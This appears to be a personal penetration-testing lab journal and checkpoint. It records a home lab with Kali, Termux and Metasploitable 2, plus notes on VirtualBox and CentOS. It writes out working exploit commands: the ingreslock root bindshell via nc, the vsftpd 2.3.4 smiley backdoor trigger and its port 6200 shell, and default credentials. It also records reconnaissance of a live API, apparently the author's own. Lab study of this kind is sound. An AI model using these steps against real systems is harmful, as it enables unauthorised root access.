# Lab Session State & Checkpoint

**Last Updated**: October 3, 2026, 21:35 SAST  
**Author / Lab User**: `general@lee` (Kali Linux) / `radlee`  
**GitHub Repository**: [`https://github.com/radlee/lab-notes.git`](https://github.com/radlee/lab-notes.git)  
**Current Phase**: Termux Mobile Access Established, Target Verification & Kali SSH Setup

---

## 1. Quick Resumption Guide for Termux (Android)

If you are continuing this lab from **Termux on Android**:

### A. Clone / Pull Latest Notes & States
```bash
pkg update && pkg install git gh curl jq netcat-openbsd nmap openssh -y
git clone https://github.com/radlee/lab-notes.git
cd lab-notes
git pull
```

### B. Network Context (When Phone is on Home Wi-Fi `192.168.0.0/24`)
Because the VMs are bridged directly to your home Wi-Fi network, your Android device running Termux can directly access all local lab targets without port forwarding!

| Machine / Target | IP Address | MAC / Identifier | Role & Status |
| :--- | :--- | :--- | :--- |
| **Android Termux** | `192.168.0.193` | `wlan0` | **Mobile Controller** (Active, tools installed: `gh`, `nmap`, `nc`, `jq`) |
| **Metasploitable 2** | `192.168.0.155` | `08:00:27:1d:80:01` | **Vulnerable Linux Target** (Active, Bridged, Running) |
| **Kali Linux** | `192.168.0.149` | `eth0` | **Attack Box** (Online; SSH port 22 closed, pending `systemctl enable --now ssh`) |
| **Windows 11 Host** | `192.168.0.125` | Wi-Fi Host Adapter | VirtualBox Hypervisor host |
| **CentOS Stream 9** | Assigned via DHCP | Anaconda Installer | Target VM 2 (Installation Summary active) |
| **radblok API** | `https://radblok-api.onrender.com` | Public Cloud API | Live Express / MongoDB REST backend (Verified UP) |
| **radblok Frontend** | `radblok.co.za` | Cloudflare CPT PoP | Pending domain renewal / PaaS reactivation |

---

## 2. Tested & Verified Exploit Vectors (Metasploitable 2 @ 192.168.0.155)

### Vector 1: Unauthenticated Root Bindshell (Port 1524 - Ingreslock)
An old diagnostic listener left running via `xinetd` binds directly to `/bin/sh` with root privileges.
```bash
# Direct root access from Termux or Kali:
nc -vn 192.168.0.155 1524
# Once connected:
id
# Output: uid=0(root) gid=0(root) groups=0(root)
```

### Vector 2: vsftpd 2.3.4 Smiley Backdoor (CVE-2011-2523)
Supply-chain compromised FTP daemon. Triggered by sending `:)` in the username:
```bash
# Terminal 1: Send trigger
nc -vn 192.168.0.155 21
USER hacker:)
PASS password

# Terminal 2: Connect to spawned root backdoor listener (port 6200)
nc -vn 192.168.0.155 6200
# Upgrade raw socket to interactive PTY:
python -c 'import pty; pty.spawn("/bin/bash")'
```

### Vector 3: Distcc Daemon Execution (Port 3632)
`distccd` running with `--allow 0.0.0.0/0` under `daemon` user (CVE-2004-2687). Exploit with Nmap NSE or custom socket payload.

### Vector 4: SSH / Direct Access Credentials
- Default credentials: `msfadmin` / `msfadmin`
- User accounts audited: `service` / `service`, `user` / `user`, `postgres` / `postgres`
- Shadow hash algorithm: `$1$` (MD5-crypt legacy hashes in `/etc/shadow`)

---

## 3. Cloud Target Reconnaissance (`radblok-api.onrender.com`)

The live production backend was mapped and verified from Kali:
- **Root Endpoint**: `GET https://radblok-api.onrender.com/api` -> returns `{"message":"Welcome to radblok API"}`
- **Users Endpoint**: `GET https://radblok-api.onrender.com/api/users` -> returns author objects (`leecpt@gmail.com`, `posts: 3`)
- **Posts Endpoint**: `GET https://radblok-api.onrender.com/api/posts` -> returns published blog posts (`total: 3`)
- **Tech Stack**: Node.js, Express (`x-powered-by: Express`), MongoDB with Mongoose (`_id`, `__v`), Cloudinary image hosting.
- **CORS Config**: `access-control-allow-credentials: true`, Methods: `GET,HEAD,PUT,PATCH,POST,DELETE`.

---

## 4. Hardware & Hypervisor Notes (VirtualBox on Intel Celeron N4020)

1. **CPU Microarchitecture**:
   - Host CPU: **Intel Celeron N4020 @ 1.10GHz** (Gemini Lake Refresh).
   - Instruction Level: Supports up to **x86-64-v2**.
   - **Crucial Lesson**: CentOS 10 and RHEL 10 strictly require **x86-64-v3 (AVX2)** instructions. Running CentOS 10 on Celeron CPUs causes an immediate Guru Meditation triple fault (`VINF_EM_TRIPLE_FAULT`).
   - **Fix Applied**: Upgraded lab target to **CentOS Stream 9**, which fully supports x86-64-v2 and runs flawlessly.
2. **VirtualBox Usability Settings**:
   - Pointing Device: `usbtablet` (prevents mouse lock/traps).
   - AutoCapture: `GUI/Input/AutoCapture` set to `false`.
   - Message Dialogs: Suppressed (`confirmInputCapture`, `remindAboutAutoCapture`, `remindAboutMouseIntegrationOff`, `remindAboutKeyboardAuxiliary`).

---

## 5. Lab Journal Index (Entries 006 - 023)

- **Entry 006–011**: Passive DNS, whois, CNAME chains, GCP us-west1 cluster, Cloudflare edge scans.
- **Entry 012**: Layer 7 headers (`curl -IL`), Cape Town PoP (`CPT`), 301 canonical redirect, HTTP 503 Render routing states.
- **Entry 013**: TLS profile on `www.radblok.co.za` (Google Trust Services `WE1`, 256-bit ECDSA, 90-day lifetime).
- **Entry 014**: Dual certificate micro-provisioning comparison & `/robots.txt` edge interception.
- **Entry 015**: Shodan passive OSINT: IoT and banner information leaks (HP printers, Redis).
- **Entry 016**: Subnet analysis (`net:216.24.57.0/24`) & SNI isolation.
- **Entry 017**: DNS Zone Transfer (AXFR) testing with `dig`: TCP RST vs RFC refusal.
- **Entry 018**: Metasploitable 2 boot repair, ICMP round-trip verification, and 22 open listening services via Nmap.
- **Entry 019**: Unauthenticated Root Bindshell: Ingreslock (TCP 1524) exploitation & architectural breakdown.
- **Entry 020**: Linux internal audit: `/etc/shadow` MD5-crypt hashes, xinetd superserver PID 4622, socket discovery.
- **Entry 021**: Backend REST API Reconnaissance: radblok-api.onrender.com mapped to Express, MongoDB, Cloudinary.
- **Entry 022**: Supply Chain Backdoor: vsftpd 2.3.4 (CVE-2011-2523), smiley trigger `:)`, port 6200 listener, raw sockets vs interactive PTY.
- **Entry 023**: Layer 2 & 3 Host Verification: ARP resolution, VirtualBox OUI (`08:00:27`), and cross-host routing proof.

---

## 6. Next Steps Checklist
- [ ] **Resume Action**: Start SSH on Kali Linux (`sudo systemctl enable --now ssh` on `192.168.0.149`), then connect via `ssh general@192.168.0.149`.
- [ ] Complete CentOS Stream 9 Anaconda installation (Storage partition -> Root password -> Create user -> Reboot).
- [ ] Conduct comprehensive service scan against CentOS Stream 9 once booted.
- [ ] Test API authenticated routes on `radblok-api.onrender.com` (POST / login / JWT tokens).
- [ ] Monitor domain status for `radblok.co.za`.
